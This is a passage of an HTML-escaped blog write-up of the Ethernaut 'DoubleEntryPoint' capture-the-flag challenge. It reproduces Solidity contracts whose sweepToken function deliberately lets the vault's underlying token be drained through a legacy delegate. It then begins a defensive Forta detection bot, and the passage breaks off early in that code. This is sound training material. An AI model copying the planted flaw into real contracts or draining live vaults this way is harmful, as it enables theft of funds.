&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes calldata &lt;&#x2F;span&gt;&lt;span&gt;msgData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raiseAlert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Forta &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IForta &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; IDetectionBot) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; usersDetectionBots;
&lt;&#x2F;span&gt;&lt;span&gt;  mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; botRaisedAlerts;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;detectionBotAddress) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external override &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      usersDetectionBots[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(detectionBotAddress);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes calldata &lt;&#x2F;span&gt;&lt;span&gt;msgData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external override &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    if(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(usersDetectionBots[user]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) return;
&lt;&#x2F;span&gt;&lt;span&gt;    try usersDetectionBots[user].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;handleTransaction&lt;&#x2F;span&gt;&lt;span&gt;(user, msgData) {
&lt;&#x2F;span&gt;&lt;span&gt;        return;
&lt;&#x2F;span&gt;&lt;span&gt;    } catch {}
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raiseAlert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external override &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      if(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(usersDetectionBots[user]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;) return;
&lt;&#x2F;span&gt;&lt;span&gt;      botRaisedAlerts[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  } 
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;CryptoVault &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; sweptTokensRecipient;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20 public&lt;&#x2F;span&gt;&lt;span&gt; underlying;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;recipient) {
&lt;&#x2F;span&gt;&lt;span&gt;        sweptTokensRecipient &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; recipient;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setUnderlying&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;latestToken) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(underlying) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;), &amp;quot;Already set&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        underlying &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= IERC20&lt;&#x2F;span&gt;&lt;span&gt;(latestToken);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;    ...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;    *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sweepToken&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;IERC20 &lt;&#x2F;span&gt;&lt;span&gt;token) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; underlying, &amp;quot;Can&amp;#39;t transfer underlying token&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        token.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(sweptTokensRecipient, token.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;LegacyToken &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;LegacyToken&amp;quot;, &amp;quot;LGT&amp;quot;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Ownable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    DelegateERC20 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;delegate;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;mint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(to, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;delegateToNewContract&lt;&#x2F;span&gt;&lt;span&gt;(DelegateERC20 newContract) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        delegate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; newContract;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;value) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public override &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(delegate) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) {
&lt;&#x2F;span&gt;&lt;span&gt;            return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(to, value);
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            return delegate.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(to, value, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;DoubleEntryPoint &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;DoubleEntryPointToken&amp;quot;, &amp;quot;DET&amp;quot;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;DelegateERC20&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Ownable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; cryptoVault;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; player;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; delegatedFrom;
&lt;&#x2F;span&gt;&lt;span&gt;    Forta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;forta;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;legacyToken, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;vaultAddress, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;fortaAddress, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;playerAddress) {
&lt;&#x2F;span&gt;&lt;span&gt;        delegatedFrom &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; legacyToken;
&lt;&#x2F;span&gt;&lt;span&gt;        forta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Forta&lt;&#x2F;span&gt;&lt;span&gt;(fortaAddress);
&lt;&#x2F;span&gt;&lt;span&gt;        player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; playerAddress;
&lt;&#x2F;span&gt;&lt;span&gt;        cryptoVault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; vaultAddress;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(cryptoVault, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;100 ether&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyDelegateFrom&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; delegatedFrom, &amp;quot;Not legacy contract&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fortaNotify&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; detectionBot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(forta.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;usersDetectionBots&lt;&#x2F;span&gt;&lt;span&gt;(player));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Cache old number of bot alerts
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; previousValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; forta.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;botRaisedAlerts&lt;&#x2F;span&gt;&lt;span&gt;(detectionBot);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Notify Forta
&lt;&#x2F;span&gt;&lt;span&gt;        forta.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(player, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Continue execution
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Check if alarms have been raised
&lt;&#x2F;span&gt;&lt;span&gt;        if(forta.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;botRaisedAlerts&lt;&#x2F;span&gt;&lt;span&gt;(detectionBot) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; previousValue) revert(&amp;quot;Alert has been triggered, reverting&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;to,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;value,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;origSender
&lt;&#x2F;span&gt;&lt;span&gt;    ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public override onlyDelegateFrom fortaNotify &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(origSender, to, value);
&lt;&#x2F;span&gt;&lt;span&gt;        return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;There’s totally 5 contracts paticipated in this challenge. After sorting, the relationship diagram and call flow chart drawn are as follows:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;ethernaut&#x2F;Ethernaut&#x2F;DoubleEntryPoint.svg&quot; alt=&quot;DoubleEntryPoint&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And at the end of tx, CA &lt;code&gt;ERC20 DET&lt;&#x2F;code&gt; would check if the &lt;code&gt;raiseAlert&lt;&#x2F;code&gt; has been triggered. And if it’s ture the tx would be revert. (which I haven’t mentioned in the picture).&lt;&#x2F;p&gt;
&lt;p&gt;To solve this challenge just write a &lt;code&gt;DetectionBot&lt;&#x2F;code&gt; to avoid the &lt;code&gt;CryptoVault&lt;&#x2F;code&gt; being drained out of tokens.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.6.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IDetectionBot &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;handleTransaction&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes calldata &lt;&#x2F;span&gt;&lt;span&gt;msgData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IForta &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;detectionBotAddress) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes calldata &lt;&#x2F;span&gt;&lt;span&gt;msgData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raiseAlert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;user) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
